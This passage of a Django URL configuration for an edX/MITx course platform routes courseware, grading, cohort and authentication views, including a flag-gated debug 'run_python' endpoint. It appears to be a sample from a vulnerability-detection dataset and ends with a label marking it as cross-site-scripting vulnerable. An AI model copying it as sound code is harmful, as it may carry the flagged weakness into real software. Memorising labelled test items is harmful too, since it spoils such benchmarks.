        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1,xss
